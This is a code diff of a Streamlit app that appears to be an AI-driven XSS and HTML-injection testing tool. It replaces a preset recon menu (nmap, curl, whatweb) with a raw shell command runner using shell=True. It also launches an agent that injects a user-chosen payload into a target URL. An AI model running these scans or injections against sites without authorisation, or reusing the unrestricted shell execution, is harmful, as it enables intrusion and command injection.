-            "— select —",
-            "curl headers",
-            "curl page source",
-            "nmap quick scan",
-            "whatweb",
-            "nslookup",
-            "check CSP header",
-            "check X-XSS-Protection",
-        ])
-
-    cmd_input = st.text_input(
-        "Command",
-        placeholder="curl -I https://example.com",
-        key="cmd_input"
-    )
-
-    # Auto-fill preset
-    preset_url = st.text_input("URL for preset (optional)", placeholder="https://example.com", key="preset_url")
-    if preset != "— select —" and preset_url:
-        url = preset_url.strip()
-        preset_map = {
-            "curl headers": f"curl -s -I --max-time 10 '{url}'",
-            "curl page source": f"curl -s --max-time 15 '{url}' | head -200",
-            "nmap quick scan": f"nmap -F --open {urllib.parse.urlparse(url).hostname or url}",
-            "whatweb": f"whatweb '{url}'",
-            "nslookup": f"nslookup {urllib.parse.urlparse(url).hostname or url}",
-            "check CSP header": f"curl -s -I --max-time 10 '{url}' | grep -i 'content-security-policy'",
-            "check X-XSS-Protection": f"curl -s -I --max-time 10 '{url}' | grep -i 'x-xss'",
-        }
-        if preset in preset_map:
-            st.code(preset_map[preset])
-            if st.button("▶ Run preset", type="primary"):
-                with st.spinner("Running..."):
-                    st.session_state.cmd_output = run_command(preset_map[preset])
-
-    if st.button("▶ Run command", type="secondary") and cmd_input.strip():
+with tab3:
+    st.subheader("Manual Command Runner")
+    st.caption("Run raw commands — curl, nmap, whatweb, nikto, etc.")
+    manual_cmd = st.text_input("Command", placeholder="curl -sI https://target.com | head -30")
+    if st.button("▶ Run", type="secondary") and manual_cmd.strip():
         with st.spinner("Running..."):
-            st.session_state.cmd_output = run_command(cmd_input.strip())
-
-    if st.session_state.cmd_output:
-        st.divider()
-        st.subheader("Output")
-        st.code(st.session_state.cmd_output, language="bash")
-
-        if st.button("🤖 Send output to AI for analysis"):
-            with st.spinner("Analyzing output..."):
-                q = f"I ran a security recon command and got this output. Analyze it for security issues relevant to XSS or HTML injection:\n\n```\n{st.session_state.cmd_output[:3000]}\n```"
-                reply = ask_followup(q)
-                st.markdown(reply)
-
-# ── Tab 4: Follow-up Chat ─────────────────────────────────────────────────────
-with tabs[3]:
-    st.subheader("💬 Follow-up with the AI Auditor")
-    st.caption(
-        f"Ask follow-up questions based on the current analysis context. "
-        f"History is capped at {MAX_TURNS} turns to protect your API budget."
-    )
-
-    if not st.session_state.history:
-        st.info("Run a code analysis first to establish context, then ask follow-up questions here.")
-
-    for msg in st.session_state.history:
-        role = msg["role"]
-        with st.chat_message(role):
-            st.markdown(msg["content"])
-
-    followup = st.chat_input("Ask a follow-up question...")
-    if followup:
-        with st.chat_message("user"):
-            st.markdown(followup)
-        with st.spinner("Thinking..."):
             try:
-                reply = ask_followup(followup)
-                with st.chat_message("assistant"):
-                    st.markdown(reply)
-                st.rerun()
+                result = subprocess.run(
+                    manual_cmd, shell=True, capture_output=True,
+                    text=True, timeout=30
+                )
+                out = (result.stdout + result.stderr).strip() or "(no output)"
+            except subprocess.TimeoutExpired:
+                out = "[TIMEOUT after 30s]"
             except Exception as e:
-                st.error(f"API error: {e}")
+                out = f"[ERROR] {e}"
+        st.code(out, language="bash")
+
+# ── Launch agent ──────────────────────────────────────────────────────────────
+if start_btn:
+    if not target_url.strip():
+        st.warning("Enter a target URL first.")
+    elif not user_payload.strip():
+        st.warning("Enter what you want to inject.")
+    else:
+        MAX_CRAWL_DEPTH = max_depth
+        st.session_state.running = True
+        st.session_state.done = False
+        st.rerun()
+
+# Run the agent synchronously when running == True and not done
+if st.session_state.running and not st.session_state.done:
+    run_agent(target_url.strip() or st.session_state.get("_last_target", ""),
+              user_payload.strip() or st.session_state.get("_last_payload", ""))
+    st.rerun()
